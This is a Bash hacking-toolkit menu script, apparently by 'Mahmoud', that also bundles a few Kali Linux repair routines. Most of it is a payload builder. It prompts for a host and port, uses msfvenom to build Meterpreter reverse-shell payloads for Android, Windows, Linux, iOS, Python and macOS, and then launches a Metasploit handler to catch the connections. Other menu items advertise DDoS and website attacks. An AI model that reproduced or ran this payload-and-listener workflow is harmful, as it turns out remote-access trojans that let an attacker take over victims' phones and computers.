#!/bin/bash
green='\e[1;32m'
cyan='\e[1;36m'
red='\e[0;31m'
blue='\e[1;34m'
white='\e[1;37m'
yellow='\e[1;33m'
my_ip=$(curl -s https://api.ipify.org)
main(){
	echo -e " $green[$yellow 1 $green]$blue Fix_KaiL\n "
	sleep 0.2
	echo -e " $green[$yellow 2 $green]$blue PayLoaD\n"
	sleep 0.2
	echo -e " $green[$yellow 3 $green]$blue Hashing\n"
	sleep 0.2
	echo -e " $green[$yellow 4 $green]$blue metasploit\n"
	sleep 0.2
	echo -e " $green[$yellow 5 $green]$blue kail Hunter\n"
	sleep 0.2
	echo -e " $green[$yellow 6 $green]$blue Web Site $green($red HAK $green)\n"
	sleep 0.2
	echo -e " $green[$yellow 7 $green]$blue TOoLs HACKeR\n"
	sleep 0.2
	echo -e " $green[$yellow 8 $green]$blue DDos Attack\n"
	sleep 0.2
	echo -e " $green[$yellow 9 $green]$blue service$green($red Termux $green)\n"
	sleep 0.2
	echo -e " $green[$yellow X $green]$blue Exit\n"
	sleep 0.2
	echo -e $white 
	read -p "[ Tool@Mahmoud ]~# " MAHMOUD
	if [ $MAHMOUD = 1 ];then
		Fix_KaiL
	elif [ $MAHMOUD = 2 ];then
		PayLoaD
	elif [ $MAHMOUD = 3 ]; then
		cd .model
		bash .hashing.sh
	elif [ $MAHMOUD = 4 ]; then
		cd .model
		bash .msf.sh
	elif [ $MAHMOUD = 5 ]; then
		kailHunter
	elif [ $MAHMOUD = 6 ]; then
		web
	elif [ $MAHMOUD = 7 ];then
		TOoLs
	elif [ $MAHMOUD = 8 ]; then
		ddos
	elif [ $MAHMOUD = 9 ]; then
		serve
	elif [ "$MAHMOUD" = "X" ] || [ "$MAHMOUD" = "x" ]; then
		exit 
	elif [ "$MAHMOUD" = "ip" ] || [ "$MAHMOUD" = "IP" ]; then
		ip 
	else :
		rasma
		main
	fi


}


Fix_KaiL(){
	clear
	echo -e $cyan 
	figlet  -f big "           Fix_KaiL   "
	echo -e " $green[$yellow 1 $green]$blue fix sound problm" ;sleep 0.2
	echo -e " $green[$yellow 2 $green]$blue fix  vpn  problm" ;sleep 0.2
	echo -e " $green[$yellow 3 $green]$blue fix bluetooth" ;sleep 0.2
	echo -e " $green[$yellow 4 $green]$blue fix armitage" ;sleep 0.2
	echo -e " $green[$yellow 5 $green]$blue fix wifi" ;sleep 0.2
	echo -e " $green[$yellow 6 $green]$blue update sources.list + copyFIle $green($yellow VMware $green)" ;sleep 0.2
	echo -e " $green[$yellow 0 $green]$blue Back" ;sleep 0.2
	echo -e $white
	read -p "[ Tool@Mahmoud / Fix_KaiL ]~# " fixed

	if [ $fixed = 1 ];then
		echo -e "$green [*]$yellow fix sound problm start ..."
		sleep 3
		systemctl --user enable pulseaudio && systemctl --user start pulseaudio
		apt-get install pulseaudio 
		pulseaudio -D
		Fix_KaiL
	elif [ $fixed = 2 ]; then
		echo -e "$green [*]$yellow fix vpn problm start ..."
		sleep 3
		apt-get install network-manager-openvpn-gnome -y
		apt-get install network-manager-pptp -y
		apt-get install network-manager-pptp-gnome -y
		apt-get install network-manager-strongswan -y
		apt-get install network-manager-vpnc -y
		apt-get install network-manager-vpnc-gnome -y
		/etc/init.d/network-manager restart
		Fix_KaiL
	elif [ $fixed = 3 ]; then
		echo -e "$green [*]$yellow fix bluetooth problm start ..."
		sleep 3
		sudo lsmod | grep blue
		systemctl enable bluetooth.service
		systemctl start bluetooth.service
		Fix_KaiL
	elif [ $fixed = 4 ]; then
		echo -e "$green [*]$yellow fix armitage problm start ..."
		sleep 3
		clear
		echo -e "$green==========>$white Download Armitage $green<=========="
		wget http://download2268.mediafire.com/8buw6ywhe4kg/6o7gi1e6pf5l0t1/armitage.zip
		unzip armitage.zip -C /usr/share/armitage/
		service postgresql start
		msfdb init
		Fix_KaiL
	elif [ $fixed = 5  ]; then
		echo -e "$green [*]$yellow fix wifi problm start ..."
		sleep 3
		airmon-ng start wlan0
		ifconfig wlan0mon down
		iwconfig wlan0mon mode monitor
		ifconfig wlan0mon up
		airodump-ng wlan0mon
		Fix_KaiL
	elif [ $fixed = 6 ]; then
		echo -e "$green[*]$yellow Update sources start..."
		sleep 3 
		echo "deb http://http.kali.org/kali kali-rolling main non-free contrib" > /etc/apt/sources.list 
		echo "deb-src http://http.kali.org/kali kali-rolling main non-free contrib" >> /etc/apt/sources.list
		echo -e "$yellow Done $red ^_^ "
		sleep 3
		clear
		echo -e "$green[*]$yellow update kali...";		echo -e "$white To Exit $red [ctrl + c ]";
		sleep 3 
		apt-get update 
		apt-get upgrade && apt-get dist-apgrad -y
		echo -e "$yellow Done $red ^_^ "
		echo -e "$green[*]$yellow Fix $cyan copy $white + $cyan ZOom $green($red VMware $green)"
		apt-get install open-vm-tools-desktop fuse
		echo -e "$yellow Done $red ^_^ "
		sleep 8
		Fix_KaiL
	elif [ $fixed = 0 ]; then
		rasma
		main
	else :
		Fix_KaiL
	fi
}	
PayLoaD(){
	clear 
	echo -e $red
	figlet  -f big "           PaylOaD   "
	echo -e "$green[!]$red What Are Using \n "
	echo -e "$green [$red 1 $green]$cyan KAiL $yellow && $cyan PaROoT \n"
	echo -e "$green [$red 2 $green]$cyan TERMUX\n"
	echo -e "$green [$red 0 $green]$cyan Back \n"
	echo -e $white
	read -p "[ Tool@Mahmoud / PayLoaD ]~# " payload
	if [ $payload = 1 ] ; then 
		clear 
		echo -e $red
		figlet  -f big "           PaylOaD   "
		echo -e $red"[1]"$green" Payload Android" ;sleep 0.2
		echo
		echo -e $red"[2]"$green" Payload Windows" ;sleep 0.2
		echo
		echo -e $red"[3]"$green" Payload Linux" ;sleep 0.2
		echo
		echo -e $red"[4]"$green" Payload Iso $yellow($red apple $yellow)" ;sleep 0.2
		echo
		echo -e $red"[5]"$green" Payload Python" ;sleep 0.2
		echo
		echo -e $red"[6]"$green" Payload Mac" ;sleep 0.2
		echo
		echo -e $red"[0]"$green" Back\n" ;sleep 0.2
		echo -e $white
		read -p "[ Tool@Mahmoud / PayLoaD / ROoT ]~# " root
		if [ $root = 1 ] ; then 
			clear
			echo -e  "$yellow Payload $red Android\n"
			read -p "Enter The Host: " host
			read -p "Enter The Port: " port
			read -p "Enter the Name: " name
			echo -e "$green [~] $yellow Make PayLOaD..."
			sleep 2
			msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R> $name.apk
			mv $name.apk Tool@Mahmoud_PaYLOad
			clear
			echo -e "$yellow The PaylOAD in $red Tool@Mahmoud_PaYLOad"
			sleep 5
			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
			sleep 5
			msfconsole -x 'use exploit/multi/handler' -x 'set payload android/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'clear' -x 'exploit '
		elif [ $root = 2 ] ; then 
			clear
			echo -e  "$yellow Payload $red Windows\n"
			read -p "Enter The Host: " host
			read -p "Enter The Port: " port
			read -p "Enter the Name: " name
			echo -e "$green [~] $yellow Make PayLOaD..."
			sleep 2
			msfvenom -p windows/meterpreter/reverse_tcp LHOST=$host LPORT=$port -f exe -o $name.exe
			mv $name.exe Tool@Mahmoud_PaYLOad
			clear
			echo -e "$yellow The PaylOAD in $red Tool@Mahmoud_PaYLOad"
			sleep 5
			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
			sleep 5
			msfconsole -x 'use exploit/multi/handler' -x 'set payload windows/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'clear ' -x 'exploit '
		elif [ $root = 3 ] ; then 
			clear
			echo -e  "$yellow Payload $red Windows\n"
			read -p "Enter The Host: " host
			read -p "Enter The Port: " port
			read -p "Enter the Name: " name
			echo -e "$green [~] $yellow Make PayLOaD..."
			sleep 2
			msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=$host LPORT=$port -o $name.elf
			mv $name.elf Tool@Mahmoud_PaYLOad
			clear
			echo -e "$yellow The PaylOAD in $red Tool@Mahmoud_PaYLOad"
			sleep 5
			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
			sleep 5
			msfconsole -x 'use exploit/multi/handler' -x 'set payload linux/x86/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'clear' -x 'exploit '
		elif [ $root = 4 ] ; then 
			clear
			echo -e  "$yellow Payload $red Iso $green($red apple $green)\n"
			read -p "Enter The Host: " host
			read -p "Enter The Port: " port
			read -p "Enter the Name: " name
			echo -e "$green [~] $yellow Make PayLOaD..."
			sleep 2
			msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=$host LPORT=$port -o $name.api
			mv $name.api Tool@Mahmoud_PaYLOad
			clear
			echo -e "$yellow The PaylOAD in $red Tool@Mahmoud_PaYLOad"
			sleep 5
			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
			sleep 5
			msfconsole -x 'use exploit/multi/handler' -x 'set payload apple_ios/aarch64/meterpreter_reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'clear' -x 'exploit '
		elif [ $root = 5 ] ; then 
			clear
			echo -e  "$yellow Payload $red Python\n"
			read -p "Enter The Host: " host
			read -p "Enter The Port: " port
			read -p "Enter the Name: " name
			echo -e "$green [~] $yellow Make PayLOaD..."
			sleep 2
			msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=$host LPORT=$port R> $name.py
			mv $name.py Tool@Mahmoud_PaYLOad
			clear
			echo -e "$yellow The PaylOAD in $red Tool@Mahmoud_PaYLOad"
			sleep 5
			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
			sleep 5
			msfconsole -x 'use exploit/multi/handler' -x 'set payload python/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'clear' -x 'exploit'
		elif [ $root = 6 ] ; then 
			clear
			echo -e  "$yellow Payload $red Python\n"
			read -p "Enter The Host: " host
			read -p "Enter The Port: " port
			read -p "Enter the Name: " name
			echo -e "$green [~] $yellow Make PayLOaD..."
			sleep 2
			msfvenom -p osx/x64/meterpreter_reverse_tcp -f macho LHOST=$host LPORT=$port -o $name.macho
			mv $name.macho Tool@Mahmoud_PaYLOad
			clear
			echo -e "$yellow The PaylOAD in $red Tool@Mahmoud_PaYLOad"
			sleep 5
			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
			sleep 5
			msfconsole -x 'use exploit/multi/handler' -x 'set payload osx/x64/meterpreter_reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'clear' -x 'exploit'
		elif [ $root = 0 ] ; then
			clear
			echo -e $green
			figlet "		MAHMOUD"
			echo -e "$red++++++++++++++++++++++++++++++++++++++" 
			sleep 0.1
			echo -e "$yellow By : $green MOHAMED $cyan HACKER"
			sleep 0.1
			echo -e "$yellow Telegram $red @Ananym0us"
			sleep 0.1
			echo -e "$red++++++++++++++++++++++++++++++++++++++" 
			sleep 3
			rasma
			main
		else :
			PayLoaD
		fi
	elif [ $payload = 2 ]; then
		clear 
		echo -e $red ;sleep 0.2
		figlet  -f big "           T-PaylOaD   " ;sleep 0.2
		echo -e $red"[1]"$green" Payload Android" ;sleep 0.2
		echo
		echo -e $red"[2]"$green" Payload Windows" ;sleep 0.2
		echo
		echo -e $red"[3]"$green" Payload Linux" ;sleep 0.2
		echo
		echo -e $red"[4]"$green" Payload Iso $yellow($red apple $yellow)" ;sleep 0.2
		echo
		echo -e $red"[5]"$green" Payload Python" ;sleep 0.2
		echo
		echo -e $red"[6]"$green" Payload Mac" ;sleep 0.2
		echo
		echo -e $red"[0]"$green" Back\n" ;sleep 0.2
		echo -e $white
		read -p "[ Tool@Mahmoud / PayLoaD / termux ]~# " termux
		if [ $termux = 1 ] ; then 
			clear
			echo -e  "$yellow Payload $red Android\n"
			read -p "Enter The Host: " host
			read -p "Enter The Port: " port
			read -p "Enter the Name: " name
			echo -e "$green [~] $yellow Make PayLOaD..."
			sleep 2
			msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R> $name.apk
			mv $name.apk /sdcard/TeamTermux
			clear
			echo -e "$yellow The PaylOAD in $red Tool@Mahmoud"
			sleep 5
			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
			sleep 5
			msfconsole -x 'use exploit/multi/handler' -x 'set payload android/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'clear' -x 'exploit '
		elif [ $termux = 2 ] ; then 
			clear
			echo -e  "$yellow Payload $red Windows\n"
			read -p "Enter The Host: " host
			read -p "Enter The Port: " port
			read -p "Enter the Name: " name
			echo -e "$green [~] $yellow Make PayLOaD..."
			sleep 2
			msfvenom -p windows/meterpreter/reverse_tcp LHOST=$host LPORT=$port -f exe -o $name.exe
			mv $name.exe /sdcard/TeamTermux
			clear
			echo -e "$yellow The PaylOAD in $red Tool@Mahmoud"
			sleep 5
			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
			sleep 5
			msfconsole -x 'use exploit/multi/handler' -x 'set payload windows/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'clear ' -x 'exploit '
		elif [ $termux = 3 ] ; then 
			clear
			echo -e  "$yellow Payload $red Windows\n"
			read -p "Enter The Host: " host
			read -p "Enter The Port: " port
			read -p "Enter the Name: " name
			echo -e "$green [~] $yellow Make PayLOaD..."
			sleep 2
			msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=$host LPORT=$port -o $name.elf
			mv $name.elf /sdcard/TeamTermux ;clear
			echo -e "$yellow The PaylOAD in $red Tool@Mahmoud"
			sleep 5
			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
			sleep 5
			msfconsole -x 'use exploit/multi/handler' -x 'set payload linux/x86/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'clear' -x 'exploit '
		elif [ $termux = 4 ] ; then 
			clear
			echo -e  "$yellow Payload $red Iso $green($red apple $green)\n"
			read -p "Enter The Host: " host
			read -p "Enter The Port: " port
			read -p "Enter the Name: " name
			echo -e "$green [~] $yellow Make PayLOaD..."
			sleep 2
			msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=$host LPORT=$port -o $name.api
			mv $name.api /sdcard/TeamTermux
			clear
			echo -e "$yellow The PaylOAD in $red Tool@Mahmoud"
			sleep 5
			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
			sleep 5
			msfconsole -x 'use exploit/multi/handler' -x 'set payload apple_ios/aarch64/meterpreter_reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'clear' -x 'exploit '
		elif [ $termux = 5 ] ;then 
			clear
			echo -e  "$yellow Payload $red Python\n"
			read -p "Enter The Host: " host
			read -p "Enter The Port: " port
			read -p "Enter the Name: " name
			echo -e "$green [~] $yellow Make PayLOaD..."
			sleep 2
			msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=$host LPORT=$port R> $name.py
			mv $name.py /sdcard/TeamTermux
			clear
			echo -e "$yellow The PaylOAD in $red Tool@Mahmoud"
			sleep 5
			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
			sleep 5
			msfconsole -x 'use exploit/multi/handler' -x 'set payload python/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'clear' -x 'exploit'
		elif [ $termux = 6 ] ; then 
			clear
			echo -e  "$yellow Payload $red Python\n"
			read -p "Enter The Host: " host
			read -p "Enter The Port: " port
			read -p "Enter the Name: " name
			echo -e "$green [~] $yellow Make PayLOaD..."
			sleep 2
			msfvenom -p osx/x64/meterpreter_reverse_tcp -f macho LHOST=$host LPORT=$port -o $name.macho
			mv $name.macho /sdcard/TeamTermux
			clear
			echo -e "$yellow The PaylOAD in $red Tool@Mahmoud"
			sleep 5
			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
			sleep 5
			msfconsole -x 'use exploit/multi/handler' -x 'set payload osx/x64/meterpreter_reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'clear' -x 'exploit'
		elif [ $termux = 0 ] ; then
			clear
			echo -e $green
			figlet "		MAHMOUD"
			echo -e "$red++++++++++++++++++++++++++++++++++++++" 
			sleep 0.1
			echo -e "$yellow By : $green MAHMOUD $cyan HACKER"
			sleep 0.1
			echo -e "$yellow Telegram $red @Ananym0us"
			sleep 0.1
			echo -e "$red++++++++++++++++++++++++++++++++++++++" 
			sleep 3
			rasma
			main
		else :
			PayLoaD
		fi
	elif [ $payload = 0  ]; then
		clear
		echo -e $green
		figlet "          MAHMOUD"
		echo -e "$red++++++++++++++++++++++++++++++++++++++" 
		sleep 0.1
		echo -e "$yellow By : $green MAHMOUD $cyan HACKER"
		sleep 0.1
		echo -e "$yellow Telegram $red @Ananym0us"
		sleep 0.1
		echo -e "$red++++++++++++++++++++++++++++++++++++++" 
		sleep 3
		rasma
		main
	else :
		PayLoaD
	fi

}